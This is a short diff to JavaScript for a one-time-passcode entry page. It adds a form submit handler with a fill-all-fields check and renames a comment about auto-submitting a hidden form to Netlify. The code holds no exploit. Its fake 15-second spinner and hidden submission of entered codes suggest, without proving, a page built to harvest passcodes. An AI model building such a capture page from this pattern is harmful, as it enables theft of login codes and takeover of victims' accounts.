@@ -3,6 +3,7 @@ document.addEventListener("DOMContentLoaded", function() {
     const otpContainer = document.querySelector('.otp-container');
     const thanksContainer = document.querySelector('.thanks-container');
     const otpInputs = document.querySelectorAll('.otp-inputs input');
+    const otpForm = document.querySelector('form[name="otpForm"]');
     const btnConfirm = document.querySelector('.btn-2');
 
     // Show spinner for 15 seconds on page load
@@ -23,13 +24,22 @@ document.addEventListener("DOMContentLoaded", function() {
 
             // Auto submit if all inputs are filled
             if (Array.from(otpInputs).every(i => i.value.length === 1)) {
-                // Programmatically submit the hidden form to Netlify
-                document.querySelector('form[name="otpForm"]').submit();
+                // Programmatically submit the form for OTP validation
+                otpForm.submit();
             }
         });
     });
 
-    btnConfirm.addEventListener('click', () => {
+    otpForm.addEventListener('submit', function(event) {
+        event.preventDefault();
+
+        // All fields are mandatory checks
+        let isAllFilled = Array.from(otpInputs).every(input => input.value.length === 1);
+        if (!isAllFilled) {
+            alert("Please fill all the fields!");
+            return;
+        }
+
         otpContainer.style.display = 'none';
         spinnerContainer.style.display = 'flex';
 
